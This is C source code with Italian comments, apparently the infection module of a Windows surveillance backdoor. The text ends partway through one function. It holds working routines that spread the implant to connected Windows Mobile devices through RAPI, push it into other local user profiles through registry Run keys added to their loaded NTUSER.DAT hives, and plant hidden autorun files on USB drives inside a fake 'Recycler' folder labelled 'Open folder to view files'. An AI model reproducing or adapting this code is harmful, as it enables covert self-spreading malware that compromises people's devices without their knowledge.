#define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
#define PDA_AGENT_SLEEP_TIME 30000 // Ogni 30 secondi controlla il PDA
#define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
#define VMW_AGENT_SLEEP_TIME 10*60*1000 // Ogni 10 minuti controlla le VM

BOOL bPM_PDAAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_pdacp = FALSE; // Semaforo per l'uscita del thread per pda
BOOL bPM_sprcp = FALSE; // Semaforo per l'uscita del thread per spread
BOOL bPM_usbcp = FALSE; // Semafoto per l'uscita del thread per usb
BOOL bPM_vmwcp = FALSE; // Semafoto per l'uscita del thread per vm

HANDLE hPDAThread = NULL;
HANDLE hSpreadThread = NULL;
HANDLE hUSBThread = NULL;
HANDLE hVMWThread = NULL;

BOOL infection_spread = FALSE;	// Deve fare spread?
BOOL infection_pda = FALSE;		// Deve infettare i telefoni?
BOOL infection_usb = FALSE;		// Deve infettare le USB?
BOOL infection_vm = FALSE;		// Deve infettare le VM?

BOOL one_user_infected = FALSE; // Infetta solo un utente in una run
DWORD vm_delay = VMW_AGENT_SLEEP_TIME; // Delay per il loop di polling sulle VM

extern void SM_AddExecutedProcess(DWORD);

typedef struct _RAPIINIT {
  DWORD cbSize;
  HANDLE heRapiInit;
  HRESULT hrRapiInit;
} RAPIINIT;

typedef struct _CE_FIND_DATA {
  DWORD dwFileAttributes;
  FILETIME ftCreationTime;
  FILETIME ftLastAccessTime;
  FILETIME ftLastWriteTime;
  DWORD nFileSizeHigh;
  DWORD nFileSizeLow;
  DWORD dwOID;
  WCHAR cFileName[MAX_PATH];
} CE_FIND_DATA, *LPCE_FIND_DATA;

typedef HRESULT (WINAPI *CeRapiInitEx_t) (RAPIINIT *);
typedef HRESULT (WINAPI *CeRapiUninit_t)(void);
typedef HANDLE (WINAPI *CeCreateFile_t)(LPCWSTR,DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); 
typedef BOOL (WINAPI *CeWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CeReadFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CeCloseHandle_t)(HANDLE);
typedef BOOL (WINAPI *CeCreateDirectory_t)(LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef HANDLE (WINAPI *CeFindFirstFile_t)(LPCWSTR, LPCE_FIND_DATA);
typedef BOOL (WINAPI *CeFindNextFile_t)(HANDLE, LPCE_FIND_DATA);
typedef BOOL (WINAPI *CeDeleteFile_t)(LPCWSTR);
typedef BOOL (WINAPI *CeCreateProcess_t)(LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CeFindClose_t)(HANDLE);

CeFindFirstFile_t pCeFindFirstFile = NULL;
CeFindNextFile_t pCeFindNextFile = NULL;
CeRapiUninit_t pCeRapiUninit = NULL;
CeRapiInitEx_t pCeRapiInitEx = NULL;
CeCreateFile_t pCeCreateFile = NULL;
CeWriteFile_t pCeWriteFile = NULL;
CeReadFile_t pCeReadFile = NULL;
CeCloseHandle_t pCeCloseHandle = NULL;
CeCreateDirectory_t pCeCreateDirectory = NULL;
CeDeleteFile_t pCeDeleteFile = NULL;
CeCreateProcess_t pCeCreateProcess = NULL;
CeFindClose_t pCeFindClose = NULL;

extern void SetLoadKeyPrivs();

#define PDA_LOG_DIR L"$MS313Mobile"
#define AUTORUN_BACKUP_NAME L"Autorun4.exe"
#define CONFIG_FILE_NAME L"cptm511.dql"
#define HIVE_MOUNT_POINT L"-00691\\"
#define MAX_USER_INFECTION_COUNT 250

///////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////// Infezione Mobile //////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////

BOOL RapiInit()
{
	static BOOL rapi_init = FALSE;
	HMODULE		hrapi;

	if (rapi_init)
		return TRUE;

	if (!(hrapi = LoadLibraryW(L"rapi.dll")))
		return FALSE;

	pCeWriteFile   = (CeWriteFile_t)GetProcAddress(hrapi, "CeWriteFile");
	pCeReadFile   = (CeReadFile_t)GetProcAddress(hrapi, "CeReadFile");
	pCeRapiInitEx  = (CeRapiInitEx_t)GetProcAddress(hrapi, "CeRapiInitEx");
	pCeRapiUninit  = (CeRapiUninit_t)GetProcAddress(hrapi, "CeRapiUninit");
	pCeCreateFile  = (CeCreateFile_t)GetProcAddress(hrapi, "CeCreateFile");
	pCeCloseHandle = (CeCloseHandle_t)GetProcAddress(hrapi, "CeCloseHandle");
	pCeCreateDirectory = (CeCreateDirectory_t)GetProcAddress(hrapi, "CeCreateDirectory");
	pCeFindFirstFile   = (CeFindFirstFile_t)GetProcAddress(hrapi, "CeFindFirstFile");
	pCeFindNextFile    = (CeFindNextFile_t)GetProcAddress(hrapi, "CeFindNextFile");
	pCeDeleteFile      = (CeDeleteFile_t)GetProcAddress(hrapi, "CeDeleteFile");
	pCeCreateProcess   = (CeCreateProcess_t)GetProcAddress(hrapi, "CeCreateProcess");
	pCeFindClose = (CeFindClose_t)GetProcAddress(hrapi, "CeFindClose");

	if (!pCeWriteFile || !pCeReadFile || !pCeRapiInitEx || !pCeRapiUninit || !pCeCreateFile || !pCeCreateProcess ||
		!pCeCloseHandle || !pCeCreateDirectory || !pCeFindFirstFile || !pCeFindNextFile || !pCeDeleteFile || !pCeFindClose) {
			FreeLibrary(hrapi);
			return FALSE;
	}

	rapi_init = TRUE;
	return TRUE;
}

#define RAPI_CONNECT_SLEEP_TIME 300
BOOL TryRapiConnect(DWORD dwTimeOut)
{
    HRESULT     hr = E_FAIL;
    RAPIINIT    riCopy;
	DWORD dwRapiInit = 0;
	DWORD count;

    ZeroMemory(&riCopy, sizeof(riCopy));
    riCopy.cbSize = sizeof(riCopy);

    hr = pCeRapiInitEx(&riCopy);
    if (!SUCCEEDED(hr))
		return FALSE;

	for (count=0; count<dwTimeOut; count+=RAPI_CONNECT_SLEEP_TIME) {
		if (bPM_pdacp) 
			break;
		dwRapiInit = FNC(WaitForSingleObject)(riCopy.heRapiInit, RAPI_CONNECT_SLEEP_TIME);
		if (WAIT_OBJECT_0 == dwRapiInit) {
			if (SUCCEEDED(riCopy.hrRapiInit))
				return TRUE;
		}
	}

	pCeRapiUninit();
	return FALSE;
}

void RapiDisconnect()
{
	pCeRapiUninit();
}

BOOL FindMemoryCard(WCHAR *mmc_name, DWORD len_in_word)
{
	CE_FIND_DATA cefd;
	HANDLE hfind;

	hfind = pCeFindFirstFile(L"*", &cefd);
	if (hfind == INVALID_HANDLE_VALUE)
		return FALSE;

	do {
		if ((cefd.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY) && 
			(cefd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			_snwprintf_s(mmc_name, len_in_word, _TRUNCATE, L"%s", cefd.cFileName);		
			pCeFindClose(hfind);
			return TRUE;
		}
	} while (pCeFindNextFile(hfind, &cefd));

	pCeFindClose(hfind);
	return FALSE;
}

BOOL CopyFileToPDAFromPC(char *source, WCHAR *dest)
{
	BYTE buffer[2048];
	DWORD nread, nwrite;
	HANDLE hdst, hsrc;

	hsrc = CreateFileA(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hsrc == INVALID_HANDLE_VALUE)
		return FALSE;

	hdst = pCeCreateFile(dest, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		CloseHandle(hsrc);
		return FALSE;
	}

	while (FNC(ReadFile)(hsrc, buffer, sizeof(buffer), &nread, NULL) && nread>0) 
		pCeWriteFile(hdst, buffer, nread, &nwrite, NULL);
		
	CloseHandle(hsrc);
	pCeCloseHandle(hdst);
	return TRUE;
}

BOOL CopyFileToPDAFromPDA(WCHAR *source, WCHAR *dest)
{
	BYTE buffer[2048];
	DWORD nread, nwrite;
	HANDLE hdst, hsrc;

	hsrc = pCeCreateFile(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hsrc == INVALID_HANDLE_VALUE)
		return FALSE;

	hdst = pCeCreateFile(dest, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hsrc);
		return FALSE;
	}

	while (pCeReadFile(hsrc, buffer, sizeof(buffer), &nread, NULL) && nread>0) 
		pCeWriteFile(hdst, buffer, nread, &nwrite, NULL);
		
	pCeCloseHandle(hsrc);
	pCeCloseHandle(hdst);
	return TRUE;
}

BOOL PDAFilesPresent()
{
	HANDLE hfile;
	char check_path[_MAX_PATH];

	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBCORE_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBZOO_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	return TRUE;
}

BOOL BBFilesPresent()
{
	HANDLE hfile;
	char check_path[_MAX_PATH];
/*
	hfile = FNC(CreateFileA)(HM_CompletePath(BB_INSTALL_NAME1, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	hfile = FNC(CreateFileA)(HM_CompletePath(BB_INSTALL_NAME2, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	return TRUE;*/
	return FALSE;
}

BOOL IsPDAInfected(WCHAR *mmc_path)
{
	WCHAR check_name[MAX_PATH];
	CE_FIND_DATA cefd;
	HANDLE hfind;

	// Prima controlla se la backdoor gia' gira
	_snwprintf_s(check_name, MAX_PATH, _TRUNCATE, L"\\Windows\\%s\\%s", PDA_LOG_DIR, CONFIG_FILE_NAME);		
	hfind = pCeCreateFile(check_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);	
	if (hfind != INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hfind);
		return TRUE;
	}

	// Poi controlla se non abbiamo gia' scritto il nostro autorun sulla MMC
	_snwprintf_s(check_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
	hfind = pCeCreateFile(check_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfind != INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hfind);
		return TRUE;
	}

	return FALSE;
}

BOOL InfectPDA(WCHAR *mmc_path)
{
	char source_name[_MAX_PATH];
	WCHAR check_name[MAX_PATH], dest_name[MAX_PATH];
	HANDLE hfile;
	PROCESS_INFORMATION pi;

	// Controlla se c'e' un autorun da copiare
	_snwprintf_s(check_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.exe", mmc_path);		
	hfile = pCeCreateFile(check_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hfile);
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
		if (!CopyFileToPDAFromPDA(check_name, dest_name))
			return FALSE;
	}

	// Crea la directory se gia' non c'e'
	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577", mmc_path);	
	pCeCreateDirectory(dest_name, NULL);

	// Copia lo zoo
	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
	if (!CopyFileToPDAFromPC(HM_CompletePath(H4_MOBZOO_NAME, source_name), dest_name)) {
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
		pCeDeleteFile(dest_name);
		return FALSE;
	}

	// Copia l'exe
	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.exe", mmc_path);		
	if (!CopyFileToPDAFromPC(HM_CompletePath(H4_MOBCORE_NAME, source_name), dest_name)) {
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
		pCeDeleteFile(dest_name);
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
		pCeDeleteFile(dest_name);
		return FALSE;
	}

	// Cerca di lanciare l'exe
	pCeCreateProcess(dest_name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, NULL, &pi);
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
///////////////////////// Infezione Utenti //////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

void ReadRegValue(HKEY hive, WCHAR *subkey, WCHAR *value, DWORD *type, WCHAR **buffer)
{
	DWORD size = NULL;
	HKEY hreg;

	if (type)
		*type = 0;

	if (buffer)
		*buffer = NULL;

	if (FNC(RegOpenKeyW)(hive, subkey, &hreg) != ERROR_SUCCESS)
		return;

	if (FNC(RegQueryValueExW)(hreg, value, NULL, type, NULL, &size) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	if (!buffer) {
		FNC(RegCloseKey)(hreg);
		return;
	}
	
	*buffer = (WCHAR *)calloc(size+2, 1);
	if (!(*buffer)) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	if (FNC(RegQueryValueExW)(hreg, value, NULL, type, (LPBYTE)(*buffer), &size) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		SAFE_FREE((*buffer));
		return;
	}

	FNC(RegCloseKey)(hreg);
}

BOOL RegEnumSubKey(HKEY hive, WCHAR *subkey, DWORD index, WCHAR **buffer) 
{
	BOOL ret_val = FALSE;
	WCHAR temp_buff[1024];
	DWORD size = NULL;
	*buffer = NULL;
	HKEY hreg = NULL;

	do {
		if (FNC(RegOpenKeyW)(hive, subkey, &hreg) != ERROR_SUCCESS)
			break;

		memset(temp_buff, 0, sizeof(temp_buff));
		if (FNC(RegEnumKeyW)(hreg, index, temp_buff, (sizeof(temp_buff)/sizeof(temp_buff[0]))-1) != ERROR_SUCCESS)
			break;

		if ( ! ( (*buffer) = (WCHAR *)calloc(wcslen(temp_buff)*2+2, sizeof(WCHAR)) ) )
			break;

		swprintf_s((*buffer), wcslen(temp_buff)+1, L"%s", temp_buff);
		ret_val = TRUE;
	} while(0);

	if (hreg)
		FNC(RegCloseKey)(hreg);

	return ret_val;
}

BOOL IsUserInfected(WCHAR *dest_dir)
{
	HANDLE hfile;
	WCHAR infection_path[MAX_PATH];
	WIN32_FIND_DATAW fdw;

	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
	hfile = FNC(FindFirstFileW)(infection_path, &fdw);
	if (hfile != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hfile);
		return TRUE;
	}

	return FALSE;
}

void RollBackUser(WCHAR *dest_dir)
{
	WCHAR infection_path[MAX_PATH];
	
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4DLLNAME);
	FNC(DeleteFileW)(infection_path);
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
	FNC(SetFileAttributesW)(infection_path, FILE_ATTRIBUTE_NORMAL);
	FNC(DeleteFileW)(infection_path);
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
	FNC(RemoveDirectoryW)(infection_path);
}

BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
{
	WCHAR lc_key[MAX_PATH], uc_key[MAX_PATH], tmp_buf[MAX_PATH*2], hive_mp[MAX_PATH];
	HKEY hOpen;

	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s\\NTUSER.DAT", home_dir);
	_snwprintf_s(hive_mp, sizeof(hive_mp)/sizeof(hive_mp[0]), _TRUNCATE, L"%s%s", user_sid, HIVE_MOUNT_POINT);
	if (FNC(RegLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp, tmp_buf) != ERROR_SUCCESS) 
		return FALSE;

#ifdef RUN_ONCE_KEY
	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Runonce", hive_mp);
	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnce", hive_mp);
#else
	// XXX-NEWREG
	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
#endif

	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, uc_key, &hOpen) != ERROR_SUCCESS &&
		FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, lc_key, &hOpen) != ERROR_SUCCESS &&
		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, uc_key, &hOpen) != ERROR_SUCCESS)  {
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
		return FALSE;
	}
	
	// Path a rundll32.exe
	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",%S", dest_dir, H4_HOME_DIR, H4DLLNAME, "PPPFTBBP08");
	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", REGISTRY_KEY_NAME);
	if (FNC(RegSetValueExW)(hOpen, uc_key, NULL, REG_EXPAND_SZ, (BYTE *)tmp_buf, (wcslen(tmp_buf)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hOpen);
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
		return FALSE;
	}
	
	FNC(RegCloseKey)(hOpen);
	FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
	return TRUE;
}

BOOL SpreadToUser(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
{
	char temp_path[MAX_PATH];
	char *drv_scramb_name;
	WCHAR infection_path[MAX_PATH];
	WCHAR source_path[MAX_PATH];

	if (!dest_dir)
		return FALSE;

	if (IsUserInfected(dest_dir))
		return FALSE;

	FNC(CreateDirectoryW)(dest_dir, NULL);
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
	FNC(CreateDirectoryW)(infection_path, NULL);

	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4DLLNAME, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4DLLNAME);
	if (!FNC(CopyFileW)(source_path, infection_path, FALSE)) {
		RollBackUser(dest_dir);
		return FALSE;
	}

	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4_CONF_FILE, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
	if (!FNC(CopyFileW)(source_path, infection_path, FALSE)) {
		RollBackUser(dest_dir);
		return FALSE;
	}

	if (!InfectRegistry(dest_dir, home_dir, user_sid)) {
		RollBackUser(dest_dir);
		return FALSE;
	}

	// Cerca di copiare il driver (se c'e')
	if (drv_scramb_name = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) {
		_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(drv_scramb_name, temp_path));
		_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, drv_scramb_name);
		FNC(CopyFileW)(source_path, infection_path, FALSE);
		SAFE_FREE(drv_scramb_name);
	}

	// Cerca di copiare il codec (se c'e')
	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4_CODEC_NAME, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CODEC_NAME);
	FNC(CopyFileW)(source_path, infection_path, FALSE);

	// Cerca di copiare la dll 64 (se c'e')
	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H64DLL_NAME, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H64DLL_NAME);
	FNC(CopyFileW)(source_path, infection_path, FALSE);

	return TRUE;
}

WCHAR *GetLocalSettings(WCHAR *tmp_dir, char *curr_home)
{
	WCHAR *temp_string, *ptr = NULL;
	char *ptr2 = NULL;
	static WCHAR ret_string[MAX_PATH];
	DWORD len;

	ZeroMemory(ret_string, sizeof(ret_string));
	temp_string = _wcsdup(tmp_dir);
	if (!temp_string)
		return ret_string;
	if (ptr = wcschr(temp_string, L'\\')) {
		ptr++;
		if (ptr = wcschr(ptr, L'\\')) {
			ptr++;
			if (ptr = wcschr(ptr, L'\\')) {
				ptr++;
				*ptr = 0;
			}
		}
	}

	if (ptr2 = strchr(curr_home, '\\')) {
		ptr2++;
		if (ptr2 = strchr(ptr2, '\\')) {
			ptr2++;
			if (ptr2 = strchr(ptr2, '\\')) 
				ptr2++;
		}
	}

	if (ptr && ptr2) {
		_snwprintf_s(ret_string, MAX_PATH, _TRUNCATE, L"%s%S", temp_string, ptr2);		
		len = wcslen(ret_string); 
		if (len>0) {
			if (ret_string[len-1] == L'\\')
				ret_string[len-1] = 0;

			ptr = wcsrchr(ret_string, L'\\');
			if (ptr)
				*ptr = 0;
		}
	}

	SAFE_FREE(temp_string);
	return ret_string;
}

void InfectUsers()
{
	WCHAR tmp_buf[512];
	WCHAR *user_sid = NULL;
	WCHAR *user_home = NULL;
	WCHAR *user_temp = NULL;
	WCHAR *temp_home = NULL;
	WCHAR *tmp_ptr = NULL;
	WCHAR *user_name = NULL;
	DWORD i;
	
	for (i=0;;i++) {
		// Infetta un solo utente in una run
		if (one_user_infected)
			break;

		// Cicla i profili (tramite i sid)
		if (!RegEnumSubKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\", i, &user_sid))
			break;

		// E' un utente di sistema
		if (wcsncmp(user_sid, L"S-1-5-21-", wcslen(L"S-1-5-21-"))) {
			SAFE_FREE(user_sid);
			continue;
		}

		// Prende la home
		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s\\", user_sid);
		ReadRegValue(HKEY_LOCAL_MACHINE, tmp_buf, L"ProfileImagePath", NULL, &user_home);
		if (!user_home) {
			SAFE_FREE(user_sid);
			continue;
		}
		ZeroMemory(tmp_buf, sizeof(tmp_buf));
		FNC(ExpandEnvironmentStringsW)(user_home, tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]));
		SAFE_FREE(user_home);
		if (! (user_home = wcsdup(tmp_buf)) ) {
			SAFE_FREE(user_sid);
			continue;
		}
	
		// Prende la Temp
		ReadRegValue(HKEY_CURRENT_USER, L"Environment\\", L"TEMP", NULL, &temp_home);		
		if (!temp_home) {
			ReadRegValue(HKEY_CURRENT_USER, L"Environment\\", L"TMP", NULL, &temp_home);		
			if (!temp_home) {
				SAFE_FREE(user_sid);
				SAFE_FREE(user_home);
				continue;
			}
		}

		if (!(tmp_ptr = wcschr(temp_home, L'\\')) || !(user_temp = _wcsdup(tmp_ptr))) {
			SAFE_FREE(user_sid);
			SAFE_FREE(temp_home);
			SAFE_FREE(user_home);
			continue;
		}
		
		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s%s", user_home, user_temp);	
		tmp_ptr = GetLocalSettings(tmp_buf, H4_HOME_PATH); // Ricava la directory dove dropparsi
		
		if (tmp_ptr[0] && SpreadToUser(tmp_ptr, user_home, user_sid)) {
			if ( user_name = wcsrchr(user_home, L'\\') ) {
				user_name++;
				_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"[Inf. Module]: Spread to %s", user_name);
				SendStatusLog(tmp_buf);	
			}
			one_user_infected = TRUE;
		}
		//SAFE_FREE(tmp_ptr);

		SAFE_FREE(user_sid);
		SAFE_FREE(temp_home);
		SAFE_FREE(user_home);
		SAFE_FREE(user_temp);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////// Infezione USB //////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////

BOOL IsUSBInfected(WCHAR *drive_letter)
{
	WCHAR file_path[MAX_PATH];
	HANDLE hfile;

	_snwprintf_s(file_path, MAX_PATH, _TRUNCATE, L"%s\\autorun.inf", drive_letter);
	hfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	return TRUE;
}

#define LOCALIZED_USB_AUTORUN "Open folder to view files"
#define LOCALIZED_USB_RECYCLE "Recycler"
#define LOCALIZED_USB_SID "S-1-5-21-4125489612-33920608401-12510794-1000"
#define DESKTOP_INI_STRING "[.ShellClassInfo]\r\nIconResource=%systemroot%\\system32\\SHELL32.dll,32\r\nIconFile=%systemRoot%\\system32\\SHELL32.dll\r\nIconIndex=32"

BOOL InfectUSB(WCHAR *drive_letter, char *rcs_name)
{
	char autorun_format[]="[Autorun]\r\nAction=%s\r\nIcon=%%systemroot%%\\system32\\shell32.dll,4\r\nShellexecute=.\\%s\\%s\\%s.exe";
	char autorun_string[512];
	WCHAR file_path[MAX_PATH];
	WCHAR recycle_path[MAX_PATH];
	WCHAR sid_path[MAX_PATH];
	WCHAR dini_path[MAX_PATH];
	char exe_file[MAX_PATH];
	char bd_path[MAX_PATH];
	HANDLE hfile;
	DWORD dummy;

	// Verifica che esista il file della backdoor
	HM_CompletePath(rcs_name, bd_path);
	hfile = CreateFile(bd_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);

	// Crea il file di autorun
	_snwprintf_s(file_path, MAX_PATH, _TRUNCATE, L"%s\\autorun.inf", drive_letter);
	hfile = CreateFileW(file_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	_snprintf_s(autorun_string, sizeof(autorun_string), _TRUNCATE, autorun_format, LOCALIZED_USB_AUTORUN, LOCALIZED_USB_RECYCLE, LOCALIZED_USB_SID, rcs_name);
	WriteFile(hfile, autorun_string, strlen(autorun_string), &dummy, NULL);
	CloseHandle(hfile);
	SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);	

	// Crea la RecycleBin
	_snwprintf_s(recycle_path, MAX_PATH, _TRUNCATE, L"%s\\%S", drive_letter, LOCALIZED_USB_RECYCLE);
	CreateDirectoryW(recycle_path, NULL);
	SetFileAttributesW(recycle_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	_snwprintf_s(dini_path, MAX_PATH, _TRUNCATE, L"%s\\desktop.ini", recycle_path);
	hfile = CreateFileW(dini_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		WriteFile(hfile, DESKTOP_INI_STRING, strlen(DESKTOP_INI_STRING), &dummy, NULL);
		CloseHandle(hfile);
	}
	SetFileAttributesW(dini_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

	// Crea il subfolder e ci copia il file
	_snwprintf_s(sid_path, MAX_PATH, _TRUNCATE, L"%s\\%S", recycle_path, LOCALIZED_USB_SID);
	CreateDirectoryW(sid_path, NULL);
